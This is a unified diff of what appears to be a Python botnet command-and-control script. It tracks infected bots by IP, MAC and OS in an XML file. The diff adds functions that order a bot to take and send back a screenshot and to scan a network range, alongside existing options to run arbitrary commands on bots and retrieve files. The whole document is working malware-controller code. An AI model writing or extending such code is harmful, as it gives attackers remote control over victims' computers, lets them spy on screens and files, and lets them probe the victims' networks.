@@ -80,7 +80,7 @@ def add_bot(client):
     mac = client.recv(1024)
     os = client.recv(1024)
 
-    print('%s, %s, %s' % (ip, mac, os))
+    print('[*-->New bot connection \n\tip:%s\n\tmac:%s\n\tos:%s' % (ip, mac, os))
     # Open the file as XML, and get all the bots that exist
     bot_list = minidom.parse('bots.xml')
     bots = bot_list.getElementsByTagName('bot')
@@ -97,7 +97,7 @@ def add_bot(client):
     my_file.write(bot_list.toxml())
     my_file.close()
 
-    print('*[--> Bot was added')
+    print('[*--> Bot was added')
     print('>>> \n')
 
 
@@ -200,9 +200,43 @@ def get_file(the_file):
             recv_file.write(file_stream)
             file_stream = client.recv(1024)
 
-        print('[*-->file get')
+        print('[*-->screen get')
         print('>>> ')
-		
+
+
+def do_scan(ip_to_scan):
+    # create a socket object
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # connect the client
+    client.connect((send_host, send_port))
+    client.send('[*-->scan')
+
+    if client.recv(1024) == '[*-->ok':
+        client.send(ip_to_scan)
+
+
+def take_ss():
+    # create a socket object
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    # connect the client
+    client.connect((send_host, send_port))
+    client.send('[*-->take_screen')
+
+    if client.recv(1024) == '[*-->ok':
+        client.send('[*-->start')
+        print ("Receiving...")
+        recv_file = open('screen.png', 'wb')
+        file_stream = client.recv(1024)
+
+        while file_stream:
+            print ("Receiving...")
+            recv_file.write(file_stream)
+            file_stream = client.recv(1024)
+
+        print('[*-->screen get')
+        print('>>> ')
 
 # ---------- END FUNCTIONS ---------- #
 
@@ -266,22 +300,18 @@ while True:
         get_file(file_to_get)
 
     elif select == 3:  # Tell bot to Screen Shot
-        print('shooting screen')
-        # TODO MAKE THIS WORK
+        take_ss()
 
     elif select == 4:  # Tell bot to Scan network
-        #Prompt the user to input a network address
-	net_id = input("Enter a network address in CIDR format, enclosed with quotes (ex.: '192.168.1.0/24'): ")
-	
-	#send network ID to bot to use locally        
-	send_cmd(raw_input('do_scan(net_id)'))
+        ip_to_scan = raw_input('Enter a IP + CIDR (ex.: 192.168.1.0/24) >>> \n')
+        do_scan(ip_to_scan)
 
     elif select == 5:  # Tell bot to run a command
         cmd_to_run = raw_input('The CMD >>> \n')
         send_cmd(cmd_to_run)
-		
+
     elif select == 6:  # Exit the Script
-        end()
+        exit()
 
     else:
         choice_error()
